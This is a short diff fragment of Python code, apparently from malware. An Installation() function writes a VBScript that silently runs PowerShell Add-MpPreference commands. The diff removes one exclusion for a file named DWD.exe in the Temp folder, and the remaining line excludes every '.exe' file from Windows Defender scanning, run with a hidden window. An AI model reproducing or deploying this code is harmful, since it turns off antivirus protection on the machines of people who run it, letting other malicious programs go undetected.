@@ -100,9 +100,6 @@ def Installation():
         text_file = open("val.vbs", "w")
         text_file.write(f'''
 Set objShell = WScript.CreateObject("WScript.Shell")
-objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionPath '\AppData\Local\Temp\DWD.exe'", 0, True
-
-Set objShell = WScript.CreateObject("WScript.Shell")
 objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionExtension 'exe'", 0, True
 
 Set objShell = WScript.CreateObject("WScript.Shell")
